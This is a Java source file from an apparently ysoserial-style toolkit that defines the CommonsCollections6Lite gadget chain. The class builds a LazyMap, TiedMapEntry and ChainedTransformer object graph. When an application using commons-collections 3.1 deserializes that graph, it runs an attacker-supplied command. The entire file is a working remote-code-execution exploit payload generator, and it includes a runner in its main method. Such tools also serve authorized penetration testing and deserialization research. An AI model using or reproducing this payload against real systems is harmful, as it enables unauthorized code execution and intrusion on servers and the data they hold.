package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.PayloadRunner;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import com.h2tg.ysogate.payloads.ObjectPayload;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Reflections;

import java.util.HashMap;
import java.util.Map;


@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.MATTHIASKAISER})
public class CommonsCollections6Lite implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
		Transformer[] transformers     = Gadgets.makeTransformer(command);
		Transformer   transformerChain = new ChainedTransformer(fakeTransformers);
		Map           innerMap         = new HashMap();
		Map           outerMap         = LazyMap.decorate(innerMap, transformerChain);
		TiedMapEntry  tme              = new TiedMapEntry(outerMap, "su18");
		Map           expMap           = new HashMap();
		expMap.put(tme, "su18");
		outerMap.remove("su18");

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
		return expMap;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections6Lite.class, args);
	}
}
